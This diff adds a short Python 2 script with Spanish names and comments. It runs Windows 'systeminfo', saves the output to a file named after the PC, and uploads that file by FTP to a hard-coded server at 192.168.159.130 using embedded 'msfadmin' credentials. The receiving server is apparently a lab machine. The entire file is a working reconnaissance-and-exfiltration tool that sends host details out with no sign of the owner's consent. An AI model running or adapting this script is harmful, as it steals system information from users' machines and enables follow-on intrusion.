@@ -1,0 +1,53 @@
+import os
+import sys
+import ftplib
+import posixpath
+
+#DannyRojas
+#@RojasKnight
+
+
+def extraer_informacion():
+	comando = "systeminfo"
+	tubo = os.popen(comando)
+	datos = tubo.readlines()
+	#-1 empieza a contar desde atras
+	nombre_pc = datos[1].split(" ")[-1].split("\n")[0]
+	nombre_fichero = "Informacion de pc-"+nombre_pc+".txt"
+	fichero = open(nombre_fichero,"w")
+	fichero.writelines(datos)
+	fichero.close()
+	return nombre_fichero	
+
+#################################################################################################################
+
+def hacer_conexion(servidor,user,password,carpeta,fichero,fichero_destino):
+	try:
+		s = ftplib.FTP(servidor, user, password)
+		try:
+			f = open(fichero, 'rb')
+			s.cwd(carpeta)
+			s.storbinary('STOR ' + fichero_destino, f)
+			f.close()
+			s.quit()
+			print "Fichero subido correctamente a:", servidor
+		except:
+			print "No fue posible subir el fichero a: ", servidor
+	except Exception, e:
+		print str(e) + "  (No es posible conectar al servidor)"
+
+def probar_conexion(servidor, user, password):
+	try:
+		s = ftplib.FTP(servidor, user, password)
+		print "Conexion satisfactoria"
+	except:
+		print "No es posible conectar al servidor"
+
+servidor_ftp = "192.168.159.130"
+servidor_usuario = "msfadmin"
+servidor_password = "msfadmin"
+servidor_carpeta = "/home/msfadmin"
+fichero = extraer_informacion()
+fichero_destino = posixpath.join(servidor_carpeta, fichero)
+#probar_conexion(servidor_ftp, servidor_usuario, servidor_password)
+hacer_conexion(servidor_ftp, servidor_usuario, servidor_password, servidor_carpeta, fichero, fichero_destino)
